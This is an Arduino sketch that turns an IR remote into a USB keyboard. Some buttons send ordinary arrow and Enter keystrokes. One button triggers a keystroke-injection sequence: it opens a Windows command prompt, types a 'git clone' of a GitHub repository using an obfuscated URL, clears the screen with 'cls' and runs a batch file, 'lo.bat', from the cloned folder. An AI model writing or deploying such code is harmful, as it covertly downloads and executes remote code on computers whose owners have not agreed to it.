#include <IRremote.h>
#include <Keyboard.h>

const int RECV_PIN = 2;
String texto;
IRrecv irrecv(RECV_PIN);
decode_results results;

void setup(){
  Serial.begin(9600);
  irrecv.enableIRIn();
  irrecv.blink13(true);
}

void loop(){
  if (irrecv.decode(&results)){
        if(results.value != 0x4AB0F7B6){
          Serial.println(results.value, HEX);
        }
        if(results.value == 0x68733A46){
           Keyboard.press(KEY_RIGHT_ARROW);
           delay(40);
           Keyboard.release(KEY_RIGHT_ARROW);
        }else
        if(results.value == 0x83B19366){
          Keyboard.press(KEY_LEFT_ARROW);
          delay(40);
          Keyboard.release(KEY_LEFT_ARROW);
        }else
        if(results.value == 0x66BF40E8){
          Keyboard.press(KEY_LEFT_GUI);
          Keyboard.press('r');
          Keyboard.releaseAll();
      
          delay(50);
          Keyboard.press('c');
          Keyboard.press('m');
          Keyboard.press('d');
          Keyboard.press(KEY_RETURN);
          Keyboard.releaseAll();
          delay(500);
          
          texto = "git clone https?**github.com*goldern*play.git";
          for(int i = 0; i < texto.length(); i++){
             if(texto[i] == '*'){
              Serial.println(texto[i]);
               Keyboard.press(220);
               Keyboard.release(220);
             }else{
               Keyboard.press(texto[i]);
               Keyboard.release(texto[i]);
             }
          }
          Keyboard.press(KEY_RETURN);
          Keyboard.release(KEY_RETURN);
          delay(1000);

          Keyboard.press('c');
          Keyboard.press('d');
          Keyboard.releaseAll();
          Keyboard.press(' ');
          Keyboard.releaseAll();
          Keyboard.press('p');
          Keyboard.press('l');
          Keyboard.press('a');
          Keyboard.press('y');
          delay(30);
          Keyboard.press(KEY_RETURN);
          Keyboard.releaseAll();

          Keyboard.press('c');
          Keyboard.press('l');
          Keyboard.press('s');
          delay(30);
          Keyboard.press(KEY_RETURN);
          Keyboard.releaseAll();

          Keyboard.press('l');
          Keyboard.press('o');
          Keyboard.press('.');
          Keyboard.press('b');
          Keyboard.press('a');
          Keyboard.press('t');
          delay(200);
          Keyboard.press(KEY_RETURN);
          Keyboard.releaseAll();
        }else
        if(results.value == 0x189D7928){
          Keyboard.press(KEY_RETURN);
          Keyboard.release(KEY_RETURN);
        }else
        if(results.value == 0x5F12E8C4){
           Keyboard.press('s');
           Keyboard.press('s');
           Keyboard.press(KEY_RETURN);
           Keyboard.releaseAll();
        }
        irrecv.resume();
  }
}